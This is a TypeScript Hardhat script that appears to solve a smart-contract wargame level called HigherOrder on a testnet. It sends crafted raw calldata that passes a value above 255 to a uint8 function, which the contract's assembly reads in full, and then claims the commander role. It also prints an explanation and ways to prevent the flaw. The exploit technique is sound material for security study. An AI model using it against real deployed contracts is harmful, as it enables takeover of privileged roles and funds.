import { ethers } from "hardhat";

/**
 * Execute the HigherOrder attack by exploiting calldata type mismatch
 * 
 * Usage:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress TARGET_ADDRESS=0xHigherOrderAddress npx hardhat run scripts/level-30-higher-order/attack.ts --network sepolia
 * 
 * Or use direct attack:
 * TARGET_ADDRESS=0xHigherOrderAddress npx hardhat run scripts/level-30-higher-order/attack.ts --network sepolia
 */
async function main() {
  console.log("Executing HigherOrder attack with calldata type mismatch...\n");
  
  // Get the addresses from environment
  const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the HigherOrder contract
    const higherOrderContract = await ethers.getContractAt("HigherOrder", targetAddress);
    
    console.log("=== Contract Addresses ===");
    console.log(`HigherOrder: ${targetAddress}`);
    if (attackContractAddress) {
      console.log(`Attack Contract: ${attackContractAddress}`);
    }
    
    // Check initial state
    let treasury = await higherOrderContract.treasury();
    let commander = await higherOrderContract.commander();
    
    console.log("\n=== Initial State ===");
    console.log(`Treasury: ${treasury}`);
    console.log(`Commander: ${commander}`);
    console.log(`Can Claim: ${treasury > 255n}`);
    
    if (commander !== ethers.ZeroAddress && commander !== signer.address) {
      console.log(`\n⚠️  Warning: Someone else is already commander: ${commander}`);
    }
    
    if (commander === signer.address) {
      console.log("\n✓ You are already the Commander! No attack needed.");
      return;
    }
    
    // Method 1: Use attack contract if available
    if (attackContractAddress) {
      console.log("\n=== Method 1: Using Attack Contract ===");
      const attackContract = await ethers.getContractAt("HigherOrderAttack", attackContractAddress);
      
      // Check state through attack contract
      const state = await attackContract.checkState();
      console.log(`Treasury (from attack contract): ${state.treasury}`);
      console.log(`Commander (from attack contract): ${state.commander}`);
      console.log(`Can Claim (from attack contract): ${state.canClaim}`);
      
      if (state.canClaim) {
        console.log("\nTreasury is already > 255, just claiming leadership...");
        const tx = await attackContract.claimLeadership();
        console.log("Transaction hash:", tx.hash);
        console.log("Waiting for confirmation...");
        await tx.wait();
        console.log("✓ Transaction confirmed");
      } else {
        console.log("\nCalling attack() to register treasury and claim leadership...");
        const tx = await attackContract.attack();
        console.log("Transaction hash:", tx.hash);
        console.log("Waiting for confirmation...");
        await tx.wait();
        console.log("✓ Transaction confirmed");
      }
      
    } else {
      // Method 2: Craft calldata manually and send directly
      console.log("\n=== Method 2: Direct Calldata Manipulation ===");
      console.log("Crafting malicious calldata...\n");
      
      // Get the function selector for registerTreasury(uint8)
      const registerTreasurySelector = ethers.id("registerTreasury(uint8)").slice(0, 10);
      
      console.log("Function Selector:");
      console.log(`  registerTreasury(uint8): ${registerTreasurySelector}`);
      
      // The value we want to set (must be > 255)
      const treasuryValue = 256n;
      
      console.log(`\nTarget Treasury Value: ${treasuryValue}`);
      
      console.log("\n📋 Calldata Structure:");
      console.log("┌──────────────┬─────────────────────────────────┬──────────────────────┐");
      console.log("│ Position     │ Value                           │ Description          │");
      console.log("├──────────────┼─────────────────────────────────┼──────────────────────┤");
      console.log("│ 0x00-0x03    │ " + registerTreasurySelector.padEnd(32) + "│ registerTreasury sel │");
      console.log("│ 0x04-0x23    │ 0x0000...0100                   │ Value = 256 (uint256)│");
      console.log("└──────────────┴─────────────────────────────────┴──────────────────────┘");
      
      console.log("\n🔍 Why This Works:");
      console.log("Normal Call Pattern:");
      console.log("  interface.registerTreasury(uint8_value)");
      console.log("  ├─ Solidity ABI encoding enforces uint8 (max 255)");
      console.log("  ├─ Calldata: selector + padded uint8 value");
      console.log("  └─ Example: 0x211c85ab + 0x00...00ff (255)");
      console.log("");
      console.log("Our Exploit:");
      console.log("  address(contract).call(crafted_calldata)");
      console.log("  ├─ We bypass ABI encoding by crafting raw bytes");
      console.log("  ├─ Calldata: selector + full uint256 value");
      console.log("  ├─ Example: 0x211c85ab + 0x00...0100 (256)");
      console.log("  └─ Assembly code: sstore(treasury_slot, calldataload(4))");
      console.log("     └─ Reads ALL 32 bytes, ignores uint8 restriction!");
      
      // Craft the malicious calldata
      // Using abi.encodePacked to concatenate selector + uint256 value
      const maliciousCalldata = ethers.concat([
        registerTreasurySelector,
        ethers.zeroPadValue(ethers.toBeHex(treasuryValue), 32)
      ]);
      
      console.log("\n🔧 Crafted Calldata:");
      console.log(maliciousCalldata);
      console.log(`Length: ${ethers.dataLength(maliciousCalldata)} bytes`);
      
      console.log("\n🎯 Attack Explanation:");
      console.log("1. Function signature: registerTreasury(uint8)");
      console.log("   - uint8 parameter expects 0-255");
      console.log("   - Solidity ABI would encode max value as 255");
      console.log("");
      console.log("2. Assembly implementation:");
      console.log("   assembly { sstore(treasury_slot, calldataload(4)) }");
      console.log("   - calldataload(4) reads 32 bytes starting from position 4");
      console.log("   - Position 4 = right after the function selector");
      console.log("   - Reads as uint256, not uint8!");
      console.log("");
      console.log("3. Our crafted calldata:");
      console.log("   - Selector (4 bytes): registerTreasury(uint8)");
      console.log("   - Value (32 bytes): 256 as uint256");
      console.log("   - Assembly reads all 32 bytes → treasury = 256");
      console.log("");
      console.log("4. Type safety bypass:");
      console.log("   - Low-level call bypasses ABI encoding");
      console.log("   - Assembly has no type checking");
      console.log("   - We can send any value we want!");
      
      console.log("\n📤 Step 1: Sending crafted calldata to set treasury...");
      const tx1 = await signer.sendTransaction({
        to: targetAddress,
        data: maliciousCalldata
      });
      
      console.log("Transaction hash:", tx1.hash);
      console.log("Waiting for confirmation...");
      await tx1.wait();
      console.log("✓ Transaction confirmed");
      
      // Verify treasury was updated
      treasury = await higherOrderContract.treasury();
      console.log(`\nTreasury updated to: ${treasury}`);
      
      if (treasury <= 255n) {
        console.log("❌ Treasury is still <= 255. Attack may have failed.");
        return;
      }
      
      console.log("✓ Treasury is now > 255! Can claim leadership.");
      
      // Step 2: Claim leadership
      console.log("\n📤 Step 2: Claiming leadership...");
      const tx2 = await higherOrderContract.claimLeadership();
      console.log("Transaction hash:", tx2.hash);
      console.log("Waiting for confirmation...");
      await tx2.wait();
      console.log("✓ Transaction confirmed");
    }
    
    // Check final state
    treasury = await higherOrderContract.treasury();
    commander = await higherOrderContract.commander();
    
    console.log("\n=== Final State ===");
    console.log(`Treasury: ${treasury}`);
    console.log(`Commander: ${commander}`);
    console.log(`Your Address: ${signer.address}`);
    
    if (commander === signer.address) {
      console.log("\n✅ SUCCESS! You are now the Commander!");
      console.log("🎉 You've successfully exploited the calldata type mismatch!");
      
      console.log("\n📚 What we learned:");
      console.log("\n1. TYPE SAFETY IN ASSEMBLY:");
      console.log("   - Solidity function parameters provide type safety");
      console.log("   - ABI encoding enforces these types");
      console.log("   - But assembly operates on raw bytes!");
      console.log("   - calldataload always reads 32 bytes, regardless of parameter type");
      
      console.log("\n2. FUNCTION SIGNATURE vs IMPLEMENTATION:");
      console.log("   - Signature: registerTreasury(uint8) - expects 0-255");
      console.log("   - Implementation: sstore(slot, calldataload(4)) - reads uint256");
      console.log("   - Mismatch allows values beyond uint8 range");
      console.log("   - Always ensure assembly matches function signature!");
      
      console.log("\n3. LOW-LEVEL CALLS BYPASS TYPE CHECKING:");
      console.log("   - Normal call: contract.function(param) → ABI encoded");
      console.log("   - Low-level call: address(contract).call(data) → raw bytes");
      console.log("   - We can craft any calldata we want");
      console.log("   - Assembly will process whatever bytes are there");
      
      console.log("\n4. COMPILER VERSION MATTERS:");
      console.log("   - Contract uses Solidity 0.6.12 (older)");
      console.log("   - Older compilers: fewer safety checks");
      console.log("   - Newer compilers: better warnings and validation");
      console.log("   - But fundamental issue: assembly bypasses type system");
      
      console.log("\n5. CALLDATA STRUCTURE:");
      console.log("   - Bytes 0-3: Function selector (4 bytes)");
      console.log("   - Bytes 4+: Parameters (each padded to 32 bytes)");
      console.log("   - calldataload(offset) reads 32 bytes from offset");
      console.log("   - Must understand this to exploit or defend");
      
      console.log("\n🔒 How to Prevent This:");
      console.log("1. Don't mix parameter types with assembly reads:");
      console.log("   ❌ function foo(uint8 x) { assembly { sstore(s, calldataload(4)) } }");
      console.log("   ✅ function foo(uint8 x) { storage_var = x; }");
      
      console.log("\n2. If using assembly, validate the data:");
      console.log("   function foo(uint8 x) {");
      console.log("       assembly {");
      console.log("           let value := calldataload(4)");
      console.log("           // Validate it fits in uint8");
      console.log("           if gt(value, 0xff) { revert(0, 0) }");
      console.log("           sstore(storage_slot, value)");
      console.log("       }");
      console.log("   }");
      
      console.log("\n3. Use Solidity's type system:");
      console.log("   - Let Solidity handle parameter validation");
      console.log("   - Avoid direct calldata manipulation");
      console.log("   - Use assembly only when absolutely necessary");
      
      console.log("\n4. Use modern compiler versions:");
      console.log("   - Update to latest stable Solidity version");
      console.log("   - Enable all compiler warnings");
      console.log("   - Use static analysis tools");
      
      console.log("\n5. Test with edge cases:");
      console.log("   - Test with maximum values for each type");
      console.log("   - Test with low-level calls");
      console.log("   - Test calldata manipulation attempts");
      console.log("   - Use fuzzing to find unexpected inputs");
      
    } else {
      console.log("\n❌ Attack failed! You are not the Commander.");
      console.log(`Current commander: ${commander}`);
      console.log("\nPossible issues:");
      console.log("- Calldata may not be constructed correctly");
      console.log("- Treasury value might not have been set properly");
      console.log("- Someone else claimed leadership first");
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing attack:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    if (error.data) {
      console.error("Error data:", error.data);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
